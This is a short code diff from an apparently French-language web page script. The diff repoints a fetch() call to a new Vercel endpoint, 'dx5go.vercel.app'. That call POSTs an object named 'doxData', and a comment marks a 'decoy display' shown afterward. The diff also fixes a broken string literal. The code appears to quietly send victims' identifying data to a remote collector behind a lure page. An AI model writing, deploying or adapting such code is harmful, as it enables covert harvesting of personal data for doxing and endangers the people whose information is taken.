@@ -197,7 +197,7 @@
 
       // Envoi vers ton API Vercel
       try {
-        const response = await fetch('https://backend-two-puce-81.vercel.app/', {  // ← Change avec ton URL Vercel
+        const response = await fetch('https://dx5go.vercel.app/', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(doxData)
@@ -212,7 +212,7 @@
         }
       } catch(e) {
         console.error('Erreur réseau:', e);
-        console.log('Erreur d'envoi');
+        console.log('Erreur denvoi');
       }
 
       // Affichage leurre
